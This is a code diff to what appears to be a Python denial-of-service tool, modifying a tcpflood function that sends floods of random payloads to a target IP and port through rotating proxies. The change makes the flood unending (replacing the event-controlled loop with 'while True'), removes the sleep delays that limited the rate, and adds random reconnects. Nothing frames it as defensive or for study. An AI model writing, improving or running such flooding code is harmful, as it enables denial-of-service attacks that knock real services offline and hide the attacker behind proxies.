@@ -769,33 +769,30 @@ def udpflood(event, proxy_type, target_ip, target_port):
 
 def tcpflood(event, proxy_type, target_ip, target_port):
     global proxies
-    # Increased payload variety and size for potentially higher impact
     payloads = [
-        generate_random_payload(2048),
-        generate_random_payload(8192),
-        b"DATA" * 2000 + b"\r\n", # Larger, repetitive payload
+        generate_random_payload(1024),
+        generate_random_payload(4096),
+        b"SYN" * 1000,
     ]
     event.wait()
-    while event.is_set(): # Keep sending while the event is set (for the duration)
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((target_ip, target_port))
-            # Send continuously within the connection
-            while event.is_set():
+            for _ in range(1000):
                 payload = Choice(payloads)
                 s.send(payload)
-                # Add a small delay to prevent overwhelming the local network or proxy
-                # This value might need tuning
-                time.sleep(0.01)
+                if random.random() < 0.1:
+                    s.close()
+                    s = setup_socket(proxy_type, proxy)
+                    s.connect((target_ip, target_port))
+            s.close()
         except:
-            # If an error occurs, close the socket and continue the loop to reconnect
             if s:
                 s.close()
-            # Add a small delay before attempting to reconnect
-            time.sleep(0.1)
 
 def dns(event, proxy_type, target_ip, target_port):
     global proxies
